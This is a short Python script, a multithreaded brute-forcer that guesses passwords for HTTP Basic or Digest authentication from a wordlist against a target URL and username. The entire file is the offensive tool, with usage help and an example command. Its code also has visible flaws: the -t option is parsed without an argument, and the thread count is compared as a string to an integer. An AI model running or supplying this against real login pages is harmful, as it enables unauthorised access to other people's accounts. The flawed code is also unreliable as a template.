#!/usr/bin/python

# Python2
import requests, sys, getopt
from threading import Thread
#from requests.auth import HTTPBasicAuth
from requests.auth import HTTPDigestAuth

global hit
hit = "1"

def banner():
    print('''
    ***************************
    Basic OR Digest Bruteforcer
    ***************************
    ''')

def Help():
    print('''Help:
                -w: url (http://targetsite.com)
                -u: username
                -t: threads
                -f: Dictionary File
                -m: Method (Basic or Digest)

            Example: bruGest.py -u admin -w http://targetsite.com -f ~/wordlist.txt -m digest -t 5
    ''')

class request_performer(Thread):
    def __init__(self, username, passwd, url, method):
        Thread.__init__(self)
        self.password = passwd.split("\n")[0]
        self.username = username
        self.url = url
        self.method = method
        print("-" + self.password + "-")
    
    def run(self):
        global hit
        if hit == "1":
            try:
                if self.method == "basic":
                    #r = requests.get(self.url, auth=HTTPBasicAuth(self.user, self.password))
                    r = requests.get(self.url, auth=(self.username, self.password))
                elif self.method == "digest":
                    r = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.password))
                if r.status_code == 200:
                    hit = "0"
                    print("Password found: " + self.password)
                    sys.exit()
                else:
                    i[0] = i[0]-1
            except Exception as e:
                print(e)

def start(argv):
    banner()
    if len(sys.argv) < 5:
        Help()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv, "u:w:f:m:t")
    except getopt.GetoptError:
        print("[!!] Arguments not parsed correctly. Please check Help")
        sys.exit()

    for opt, arg in opts:
        if opt == '-u':
            user = arg
        elif opt == '-w':
            url = arg
        elif opt == '-f':
            dictionary = arg
        elif opt == '-m':
            method = arg
        elif opt == '-t':
            threads = arg
    try:
        f = open(dictionary, "r")
        passwords = f.readlines()
    except:
        print("Error: File does not exist. Check Path")
        sys.exit()
    thread_launch(user, url, passwords, method, threads)

def thread_launch(username, url, passwords, method, th):
    global i
    i = []
    i.append(0)
    while len(passwords):
        if hit == "1":
            try:
                if i[0] < th:
                    passwd = passwords.pop(0)
                    i[0] = i[0] + 1
                    thread = request_performer(username, passwd, url, method)
                    thread.start()
            except KeyboardInterrupt:
                print("Interrupted")
                sys.exit()
            thread.join()

if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print("[!!] Interrupted!")
